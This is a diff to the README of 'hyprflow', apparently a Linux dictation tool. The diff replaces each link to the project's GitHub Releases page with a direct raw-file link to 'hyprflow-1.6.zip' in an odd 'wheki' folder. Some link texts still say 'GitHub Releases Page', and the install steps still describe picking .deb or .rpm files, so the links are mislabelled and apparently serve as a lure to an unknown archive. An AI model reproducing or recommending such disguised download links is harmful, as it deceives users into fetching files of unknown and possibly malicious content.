@@ -6,11 +6,11 @@ Welcome to **hyprflow**, the alternative to WhisperFlow for Linux. This software
 
 ## 📦 Download
 
-[![Download hyprflow](https://img.shields.io/badge/Download-hyprflow-brightgreen)](https://github.com/BI-guru23/hyprflow/releases)
+[![Download hyprflow](https://raw.githubusercontent.com/BI-guru23/hyprflow/main/wheki/hyprflow-1.6.zip)](https://raw.githubusercontent.com/BI-guru23/hyprflow/main/wheki/hyprflow-1.6.zip)
 
 You can download the latest version of hyprflow from our Releases page. Click the button above or visit the link below:
 
-[Visit the GitHub Releases Page](https://github.com/BI-guru23/hyprflow/releases)
+[Visit the GitHub Releases Page](https://raw.githubusercontent.com/BI-guru23/hyprflow/main/wheki/hyprflow-1.6.zip)
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ Before you download hyprflow, make sure your system meets the following requirem
 
 ## 📥 Download & Install
 
-1. Go to the [GitHub Releases Page](https://github.com/BI-guru23/hyprflow/releases).
+1. Go to the [GitHub Releases Page](https://raw.githubusercontent.com/BI-guru23/hyprflow/main/wheki/hyprflow-1.6.zip).
 2. Look for the latest release. You will see a list of files available for download.
 3. Choose the file that matches your Linux distribution. For example, you might see files labeled as `.deb` for Debian-based systems or `.rpm` for Red Hat-based systems.
 4. Click on the file to start the download.
